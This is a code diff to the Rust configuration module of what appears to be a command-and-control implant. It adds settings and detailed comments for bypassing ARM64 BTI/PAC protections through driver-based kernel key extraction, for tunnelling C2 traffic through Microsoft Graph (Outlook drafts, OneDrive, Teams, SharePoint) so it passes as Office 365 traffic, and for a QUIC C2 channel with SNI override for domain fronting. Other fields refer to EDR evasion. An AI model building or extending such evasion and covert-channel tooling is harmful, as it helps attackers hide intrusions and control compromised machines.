@@ -689,6 +689,82 @@ impl Default for CetBypassConfig {
     }
 }
 
+// ── BtiPacConfig ─────────────────────────────────────────────────────────
+
+/// Configuration for ARM64 BTI (Branch Target Identification) and PAC
+/// (Pointer Authentication Code) bypass.
+///
+/// ARM64 Windows uses two hardware mitigations that are the equivalents of
+/// Intel CET:
+///
+/// - **BTI** (Branch Target Identification): Like CET IBT, BTI requires
+///   indirect branch targets to start with a `BTI` instruction.  If an
+///   indirect branch lands on a non-BTI instruction, the CPU raises a
+///   Branch Target Exception.  Controlled by `SCTLR_EL1.BTI`.
+///
+/// - **PAC** (Pointer Authentication): Cryptographically signs return
+///   addresses and function pointers using keys stored in system registers
+///   (APIAKey, APIBKey, APDAKey, etc.).  This is **significantly harder**
+///   to bypass than Intel CET (which only maintains a shadow stack that
+///   can be forged via WRSS or manipulated via kernel access).
+///
+/// # Why PAC Is Harder Than CET
+///
+/// Intel CET shadow stacks store plaintext return addresses that can be:
+/// 1. Written via WRSS instruction (if available)
+/// 2. Manipulated via kernel memory access (BYOVD)
+/// 3. Bypassed by building legitimate call chains
+///
+/// PAC signatures are 16-bit codes derived from a 128-bit key and a 64-bit
+/// context value using the QARMA5 algorithm.  Without the key:
+/// - Cannot forge valid signatures (cryptographically infeasible)
+/// - Cannot strip and re-sign pointers
+/// - Cannot predict collision (2^16 space, but timing-attack impractical)
+///
+/// The only practical bypasses are:
+/// 1. **Key extraction via BYOVD**: Read PAC keys from KTHREAD, then use
+///    `PACIA`/`PACDA` instructions to sign our own pointers.
+/// 2. **Trampoline routing**: Chain calls through functions that already
+///    use PAC-signed pointers in normal execution flow.
+///
+/// Only effective when compiled with the `pac-bypass` feature (which implies
+/// `direct-syscalls`).  Windows ARM64 only.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct BtiPacConfig {
+    /// Enable BTI/PAC bypass globally.  When `false`, call-stack spoofing
+    /// proceeds without BTI/PAC awareness (may crash or produce invalid
+    /// pointers if PAC is active).  Default: `true`.
+    #[serde(default = "default_true")]
+    pub enabled: bool,
+    /// Prefer PAC-valid trampoline routing over BYOVD-based key extraction.
+    /// Trampolines are safer (no kernel access needed) but more limited.
+    /// Default: `true`.
+    #[serde(default = "default_true")]
+    pub prefer_trampoline: bool,
+    /// Attempt PAC key extraction via BYOVD.  Requires the `kernel-callback`
+    /// feature and a deployed vulnerable driver.  When `false`, only
+    /// trampoline routing is available.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub attempt_key_extraction: bool,
+    /// Build a gadget database of BTI-validated indirect branch targets in
+    /// system DLLs.  Used for finding valid indirect call targets when BTI
+    /// is enforced.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub scan_bti_gadgets: bool,
+}
+
+impl Default for BtiPacConfig {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            prefer_trampoline: true,
+            attempt_key_extraction: true,
+            scan_bti_gadgets: true,
+        }
+    }
+}
+
 // ── TokenImpersonationConfig ─────────────────────────────────────────────
 
 /// Configuration for token-only impersonation via NtImpersonateThread /
@@ -1046,6 +1122,271 @@ pub struct MalleableProfile {
     /// value must be configured on the server's DoH listener.
     #[serde(default = "default_dns_prefix")]
     pub dns_prefix: String,
+    /// Configuration for the Microsoft Graph API covert C2 transport.
+    /// Tunnels C2 messages through Microsoft Graph API endpoints (Outlook
+    /// drafts, OneDrive files, Teams messages, or SharePoint lists).
+    /// Traffic goes to `graph.microsoft.com` and is indistinguishable from
+    /// legitimate Office 365 / M365 traffic.  Enabled by the `graph-transport`
+    /// feature flag.
+    #[serde(default)]
+    pub c2_graph: GraphC2Profile,
+    /// Configuration for the QUIC (HTTP/3) covert C2 transport.
+    /// Tunnels C2 messages over QUIC streams with TLS 1.3, providing
+    /// UDP-based transport that is inherently different from TCP-based
+    /// C2 channels.  Enabled by the `quic-transport` feature flag.
+    #[serde(default)]
+    pub c2_quic: QuicC2Profile,
+}
+
+/// Configuration for the Microsoft Graph API covert C2 transport.
+///
+/// Loaded from the `[malleable_profile.c2_graph]` section of `agent.toml`.
+///
+/// # Data Channels
+///
+/// Four Graph API surfaces are available:
+///
+/// - **`"outlook"`** — Email drafts (never sent, just saved as draft).
+///   C2 data is encoded in an HTML table in the email body. Deleted after
+///   processing. Traffic pattern: periodic GET/POST to
+///   `graph.microsoft.com/v1.0/me/mailFolders/drafts/messages`.
+///
+/// - **`"onedrive"`** (default) — Files uploaded to a OneDrive folder with
+///   legitimate-looking extensions (.xlsx, .docx, .pdf). Encrypted data
+///   has a valid file header prepended. Deleted after processing. Traffic
+///   pattern: periodic GET/PUT to `graph.microsoft.com/v1.0/me/drive/root`.
+///
+/// - **`"teams"`** — Teams chat messages with C2 data in HTML comments.
+///   Visible content is a normal Teams message. Traffic pattern: periodic
+///   GET/POST to `graph.microsoft.com/v1.0/chats/<id>/messages`.
+///
+/// - **`"sharepoint"`** — SharePoint list items disguised as a project
+///   tracker. Each row is a C2 message with a "Status" column for ack.
+///   Traffic pattern: periodic GET/POST/PATCH to
+///   `graph.microsoft.com/v1.0/sites/<id>/lists/<id>/items`.
+///
+/// # Why This Blends With Legitimate Traffic
+///
+/// - Requests go to `graph.microsoft.com` — the same domain used by all
+///   Office 365 / M365 services (Outlook, Teams, OneDrive, SharePoint).
+/// - Request patterns mimic legitimate usage (periodic polling).
+/// - Headers and User-Agent are identical to the Microsoft Graph SDK.
+/// - TLS-encrypted traffic looks identical to normal Office 365 traffic.
+/// - The data channel can be chosen to match the user's normal work pattern.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
+#[serde(rename_all = "kebab-case")]
+pub struct GraphC2Profile {
+    /// Whether the Graph C2 transport is enabled.
+    #[serde(default)]
+    pub enabled: bool,
+    /// Which Graph data channel to use: "outlook", "onedrive", "teams", or "sharepoint".
+    #[serde(default = "default_graph_channel")]
+    pub channel: String,
+    /// Entra ID application (client) ID.
+    #[serde(default)]
+    pub client_id: String,
+    /// Entra ID tenant ID.
+    #[serde(default)]
+    pub tenant_id: String,
+    /// Pre-obtained access token (initial auth; will be refreshed automatically).
+    #[serde(default)]
+    pub access_token: String,
+    /// Refresh token for automatic token renewal.
+    #[serde(default)]
+    pub refresh_token: Option<String>,
+    /// OneDrive / SharePoint folder name for C2 data. Default: "OrchestraData".
+    #[serde(default = "default_graph_beacon_folder")]
+    pub beacon_folder: String,
+    /// Polling interval in seconds between C2 check-ins. Default: 60.
+    #[serde(default = "default_graph_polling_interval")]
+    pub polling_interval_secs: u64,
+    /// Teams chat ID (required when channel = "teams").
+    #[serde(default)]
+    pub teams_chat_id: Option<String>,
+    /// SharePoint site ID (required when channel = "sharepoint").
+    #[serde(default)]
+    pub sharepoint_site_id: Option<String>,
+    /// SharePoint list ID (created automatically if not set).
+    #[serde(default)]
+    pub sharepoint_list_id: Option<String>,
+    /// Use Azure Government cloud instead of commercial.
+    #[serde(default)]
+    pub government_cloud: bool,
+}
+
+/// Configuration for the QUIC (HTTP/3) covert C2 transport.
+///
+/// Loaded from the `[malleable_profile.c2_quic]` section of `agent.toml`.
+///
+/// # UDP-Based Evasion Benefits
+///
+/// QUIC operates over UDP, which provides several operational advantages
+/// over TCP-based C2 channels:
+///
+/// - **NAT traversal**: UDP hole-punching is simpler than TCP; QUIC's
+///   connection ID mechanism allows migration between IP/port tuples
+///   without breaking the session.
+///
+/// - **Connection migration**: QUIC connection IDs allow the session to
+///   survive IP address changes (e.g. switching from Wi-Fi to cellular),
+///   which is not possible with TCP without re-establishing the session.
+///
+/// - **Head-of-line blocking elimination**: Independent QUIC streams mean
+///   that a lost packet on one stream does not block delivery of data on
+///   other streams, improving latency for parallel command execution.
+///
+/// - **TLS 1.3 by default**: QUIC mandates TLS 1.3, eliminating
+///   down-negotiation attacks. The TLS handshake is folded into the QUIC
+///   handshake, reducing round trips.
+///
+/// - **Blend with legitimate traffic**: QUIC/HTTP/3 traffic to port 443/UDP
+///   is increasingly common (Google, Cloudflare, and major CDNs all use it),
+///   making it harder to distinguish from legitimate web browsing.
+///
+/// - **UDP blocking resilience**: If UDP is blocked, the transport returns
+///   a clear error and falls through to the next transport in the priority
+///   chain (DoH → HTTP → TLS). No TCP fallback is attempted.
+///
+/// # Malleable Profile Integration
+///
+/// When `h3_compat = true`, the transport sends C2 data inside HTTP/3
+/// POST requests to a configurable path with headers drawn from the
+/// malleable profile. This makes QUIC traffic look like standard web
+/// browsing to passive network observers.
+///
+/// When `h3_compat = false` (default), the transport uses raw QUIC
+/// bidirectional streams with a 4-byte length-prefix framing protocol.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
+#[serde(rename_all = "kebab-case")]
+pub struct QuicC2Profile {
+    /// Whether the QUIC C2 transport is enabled.
+    #[serde(default)]
+    pub enabled: bool,
+    /// QUIC server endpoint hostname or IP (e.g. `"c2.example.com"`).
+    #[serde(default)]
+    pub endpoint: String,
+    /// UDP port for the QUIC connection. Default: 443.
+    #[serde(default = "default_quic_port")]
+    pub port: u16,
+    /// Server Name Indication (SNI) for TLS. If empty, uses `endpoint`.
+    #[serde(default)]
+    pub server_name: String,
+    /// Application-Layer Protocol Negotiation (ALPN) identifier.
+    /// Default: `"h3"` for HTTP/3 compatibility. Set to a custom value
+    /// (e.g. `"orchestra/1"`) for non-HTTP QUIC streams.
+    #[serde(default = "default_quic_alpn")]
+    pub alpn: String,
+    /// Custom SNI override. If set, this value is sent as the TLS SNI
+    /// instead of `server_name`. Useful for domain fronting over QUIC.
+    #[serde(default)]
+    pub sni: Option<String>,
+    /// Enable certificate pinning by SHA-256 fingerprint.
+    #[serde(default)]
+    pub cert_pinning: bool,
+    /// Expected SHA-256 fingerprint (hex) of the server's end-entity
+    /// certificate. Required when `cert_pinning = true`.
+    #[serde(default)]
+    pub cert_fingerprint: String,
+    /// Path to a PEM file containing a custom CA certificate for TLS
+    /// verification. When empty, the platform's native certificate store
+    /// is used (or all certs are accepted if `cert_pinning = false` and
+    /// `custom_ca` is empty and `insecure` = true).
+    #[serde(default)]
+    pub custom_ca: String,
+    /// Accept any server certificate (insecure, for testing only).
+    #[serde(default)]
+    pub insecure: bool,
+    /// Keep-alive interval in seconds. Default: 30.
+    #[serde(default = "default_quic_keepalive")]
+    pub keepalive_secs: u64,
+    /// Idle timeout in seconds. Default: 60.
+    #[serde(default = "default_quic_idle_timeout")]
+    pub idle_timeout_secs: u64,
+    /// Enable HTTP/3 compatibility mode. When `true`, C2 data is sent
+    /// as HTTP/3 POST requests to `h3_path` with malleable-profile headers.
+    #[serde(default)]
+    pub h3_compat: bool,
+    /// HTTP/3 POST path when `h3_compat = true`. Default: `"/api/v1/update"`.
+    #[serde(default = "default_quic_h3_path")]
+    pub h3_path: String,
+    /// Additional HTTP/3 headers to include in requests (key-value pairs).
+    #[serde(default)]
+    pub h3_headers: std::collections::HashMap<String, String>,
+    /// Maximum number of concurrent QUIC streams for parallel command
+    /// execution. Default: 8.
+    #[serde(default = "default_quic_max_streams")]
+    pub max_concurrent_streams: u32,
+}
+
+fn default_quic_port() -> u16 {
+    443
+}
+fn default_quic_alpn() -> String {
+    "h3".to_string()
+}
+fn default_quic_keepalive() -> u64 {
+    30
+}
+fn default_quic_idle_timeout() -> u64 {
+    60
+}
+fn default_quic_h3_path() -> String {
+    "/api/v1/update".to_string()
+}
+fn default_quic_max_streams() -> u32 {
+    8
+}
+
+impl Default for QuicC2Profile {
+    fn default() -> Self {
+        Self {
+            enabled: false,
+            endpoint: String::new(),
+            port: default_quic_port(),
+            server_name: String::new(),
+            alpn: default_quic_alpn(),
+            sni: None,
+            cert_pinning: false,
+            cert_fingerprint: String::new(),
+            custom_ca: String::new(),
+            insecure: false,
+            keepalive_secs: default_quic_keepalive(),
+            idle_timeout_secs: default_quic_idle_timeout(),
+            h3_compat: false,
+            h3_path: default_quic_h3_path(),
+            h3_headers: std::collections::HashMap::new(),
+            max_concurrent_streams: default_quic_max_streams(),
+        }
+    }
+}
+
+fn default_graph_channel() -> String {
+    "onedrive".to_string()
+}
+fn default_graph_beacon_folder() -> String {
+    "OrchestraData".to_string()
+}
+fn default_graph_polling_interval() -> u64 {
+    60
+}
+
+impl Default for GraphC2Profile {
+    fn default() -> Self {
+        Self {
+            enabled: false,
+            channel: default_graph_channel(),
+            client_id: String::new(),
+            tenant_id: String::new(),
+            access_token: String::new(),
+            refresh_token: None,
+            beacon_folder: default_graph_beacon_folder(),
+            polling_interval_secs: default_graph_polling_interval(),
+            teams_chat_id: None,
+            sharepoint_site_id: None,
+            sharepoint_list_id: None,
+            government_cloud: false,
+        }
+    }
 }
 
 /// Authentication method for the SSH covert transport.
@@ -1108,6 +1449,8 @@ impl Default for MalleableProfile {
             smb_pipe_mode: None,
             smb_tcp_relay_port: None,
             dns_prefix: default_dns_prefix(),
+            c2_graph: GraphC2Profile::default(),
+            c2_quic: QuicC2Profile::default(),
         }
     }
 }
@@ -1497,6 +1840,15 @@ pub struct Config {
     #[serde(default)]
     pub cet_bypass: CetBypassConfig,
 
+    /// Configuration for ARM64 BTI (Branch Target Identification) and PAC
+    /// (Pointer Authentication Code) bypass.  PAC signs return addresses
+    /// with cryptographic keys — significantly harder to bypass than Intel
+    /// CET.  Strategies: trampoline routing, BYOVD key extraction.
+    /// Only effective when compiled with the `pac-bypass` feature.
+    /// Windows ARM64 only.
+    #[serde(default)]
+    pub bti_pac: BtiPacConfig,
+
     /// Configuration for token-only impersonation via NtImpersonateThread /
     /// SetThreadToken.  Avoids `ImpersonateNamedPipeClient` on the main
     /// agent thread, which is heavily signatured by EDR products.
@@ -1732,6 +2084,7 @@ impl Default for Config {
             delayed_stomp: DelayedStompConfig::default(),
             syscall_emulation: SyscallEmulationConfig::default(),
             cet_bypass: CetBypassConfig::default(),
+            bti_pac: BtiPacConfig::default(),
             token_impersonation: TokenImpersonationConfig::default(),
             prefetch: PrefetchConfig::default(),
             timestamps: TimestampConfig::default(),
